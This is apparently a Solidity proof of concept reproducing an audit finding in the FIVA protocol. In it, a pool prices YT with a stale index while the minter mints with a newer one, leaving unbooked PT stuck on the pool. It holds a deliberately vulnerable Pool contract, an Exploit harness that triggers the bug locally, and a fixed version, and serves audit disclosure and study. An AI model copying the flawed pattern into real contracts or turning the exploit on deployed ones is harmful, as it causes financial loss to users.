// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  FIVA SY-to-YT index race (Trail of Bits, AuditVault #57093).
    SYNTHETIC of the FunC handlers, cheatcode-free, one transaction.
    No warp: the race window is the state after the minter index moved
    and before the pool index did.

    Pool prices ytOut with its own index and books that many PT.
    YTMinter mints with its own index. The extra PT sits on the pool
    and is not added to totalSupplyPt. Report numbers: 1000 SY, pool
    index 1.1, minter index 1.2, 1100 booked, 1200 minted, 100 stuck. */

contract Mini {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IMinter {
    function mint(uint256 syAmount, address ytTo, address ptTo) external returns (uint256 minted);
    function mintAt(uint256 syAmount, uint256 index_, address ytTo, address ptTo) external returns (uint256 minted);
}

contract YTMinter is IMinter {
    uint256 public constant DIVIDER = 1e18;
    Mini public immutable pt;
    Mini public immutable yt;
    uint256 public index = 11e17;
    address public pool;

    constructor(Mini pt_, Mini yt_) {
        pt = pt_;
        yt = yt_;
    }

    function setPool(address pool_) external {
        pool = pool_;
    }

    function setIndex(uint256 index_) external {
        index = index_;
    }

    function mint(uint256 syAmount, address ytTo, address ptTo) external returns (uint256 minted) {
        require(msg.sender == pool, "pool");
        minted = syAmount * index / DIVIDER;
        yt.mint(ytTo, minted);
        pt.mint(ptTo, minted);
        Pool(pool).notifyMint(minted);
    }

    function mintAt(uint256 syAmount, uint256 index_, address ytTo, address ptTo) external returns (uint256 minted) {
        require(msg.sender == pool, "pool");
        minted = syAmount * index_ / DIVIDER;
        yt.mint(ytTo, minted);
        pt.mint(ptTo, minted);
        Pool(pool).notifyMint(minted);
    }
}

contract Pool {
    uint256 public constant DIVIDER = 1e18;
    Mini public immutable sy;
    Mini public immutable pt;
    Mini public immutable yt;
    YTMinter public immutable minter;
    uint256 public poolIndex = 11e17;
    uint256 public totalSupplySy;
    uint256 public totalSupplyPt;
    uint256 public ptLocked;
    uint256 public lastMinted;

    constructor(Mini sy_, Mini pt_, Mini yt_, YTMinter minter_) {
        sy = sy_;
        pt = pt_;
        yt = yt_;
        minter = minter_;
    }

    function swapSyForYt(uint256 syIn) external returns (uint256 ytOut) {
        uint256 syOut = syIn;
        ytOut = syOut * poolIndex / DIVIDER;
        // @> VULN: ytOut uses the pool index, which can lag the minter index
        sy.transferFrom(msg.sender, address(this), syIn);
        totalSupplySy += syIn;
        totalSupplyPt += ytOut;
        ptLocked += ytOut;
        lastMinted = minter.mint(syOut, msg.sender, address(this));
    }

    function notifyMint(uint256 minted) external {
        require(msg.sender == address(minter), "minter");
        uint256 unlock = minted < ptLocked ? minted : ptLocked;
        ptLocked -= unlock;
    }
}

contract PoolFixed {
    uint256 public constant DIVIDER = 1e18;
    Mini public immutable sy;
    Mini public immutable pt;
    YTMinter public immutable minter;
    uint256 public poolIndex = 11e17;
    uint256 public totalSupplyPt;
    uint256 public ptLocked;
    uint256 public lastMinted;

    constructor(Mini sy_, Mini pt_, YTMinter minter_) {
        sy = sy_;
        pt = pt_;
        minter = minter_;
    }

    function swapSyForYt(uint256 syIn) external returns (uint256 ytOut) {
        ytOut = syIn * poolIndex / DIVIDER;
        sy.transferFrom(msg.sender, address(this), syIn);
        totalSupplyPt += ytOut;
        ptLocked += ytOut;
        lastMinted = minter.mintAt(syIn, poolIndex, msg.sender, address(this));
    }

    function notifyMint(uint256 minted) external {
        require(msg.sender == address(minter), "minter");
        uint256 unlock = minted < ptLocked ? minted : ptLocked;
        ptLocked -= unlock;
    }
}

contract Exploit {
    uint256 internal constant SY_IN = 1_000 ether;

    Mini public sy;
    Mini public pt;
    Mini public yt;
    YTMinter public minter;
    Pool public pool;
    uint256 public poolIndexSeen;
    uint256 public minterIndexSeen;
    uint256 public quoted;
    uint256 public minted;
    uint256 public booked;
    uint256 public stuck;
    uint256 public userYt;

    function run() external {
        sy = new Mini("SY", "SY");
        pt = new Mini("PT", "PT");
        yt = new Mini("YT", "YT");
        minter = new YTMinter(pt, yt);
        pool = new Pool(sy, pt, yt, minter);
        minter.setPool(address(pool));
        minter.setIndex(12e17);
        poolIndexSeen = pool.poolIndex();
        minterIndexSeen = minter.index();
        sy.mint(address(this), SY_IN);
        sy.approve(address(pool), SY_IN);
        quoted = pool.swapSyForYt(SY_IN);
        minted = pool.lastMinted();
        booked = pool.totalSupplyPt();
        stuck = pt.balanceOf(address(pool)) - booked;
        userYt = yt.balanceOf(address(this));
    }
}
